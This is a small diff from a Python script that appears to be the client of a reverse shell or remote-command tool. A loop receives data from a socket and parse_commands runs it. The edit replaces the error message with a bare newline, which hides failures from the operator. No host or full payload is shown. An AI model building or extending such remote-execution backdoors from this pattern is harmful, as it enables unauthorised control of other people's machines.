@@ -152,7 +152,7 @@ def parse_commands(data):
         output_str = str(output_byte,"utf-8")
         return output_str
     except Exception as e:
-        return "[!] Error running command: " + str(e) + "\n"
+        return "\n"
 
 while True:
     data = s.recv(DATA)
